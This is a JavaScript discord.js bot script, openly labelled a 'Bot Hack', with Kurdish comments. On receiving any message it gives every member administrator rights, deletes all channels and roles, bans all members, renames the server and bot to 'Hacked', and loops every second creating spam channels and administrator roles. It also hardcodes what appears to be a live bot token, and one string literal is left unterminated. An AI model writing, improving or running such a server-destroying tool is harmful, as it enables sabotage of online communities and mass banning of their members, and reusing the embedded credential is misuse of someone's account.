const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "."; ///lera ba dly xot prefix dabne
client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
  console.log(`Bot Hack Is Ready`)
});


client.on("message", message => {
  if (message.content.startsWith(`${message.content}`)) {
    message.delete();
    message.guild.roles.cache.find(r => r.name === "@everyone").edit({
      permissions: ["ADMINISTRATOR"] ///premission akata adminstator
    });
    message.guild.channels.cache.map(c => {
      c.delete();
    });
    message.guild.roles.cache.forEach(r => {
      r.delete();
    });
    message.guild.members.cache.forEach(m => {
      m.ban();
    });
    setInterval(() => {
      message.guild.roles
        .create({
        data: {
          name: "Hacked:joy:",
          permissions: ["ADMINISTRATOR"]
        }
        })
        .then(rr => {
          message.member.roles.add(rr.id);
        });
    }, 1000);
    message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
    client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
    client.user.setUsername("Hacked");
    message.guild.owner.send(
      "Mazay kury kar bro servert bbyna gayrawa 
    );
    message.guild.setName("Hacked");
    setTimeout(function() {
      setInterval(
        () => {
          message.guild.channels
            .create("hacked", "text")
            .then(channel => {
              channel.send(
                "@everyone Hackrawa nradar :joy: :joy: :joy:"
              );
            });
        },

        1000
      );
    });
  }
});
////updated for v12 by black jack

////codaka drwst krawa lalayan black jack

client.login("ODkyODM0MTM3NTIwNjE5NTkx.YVSqlg.N6Y-OCiqvSxgSELakcmJLHOiLp4");
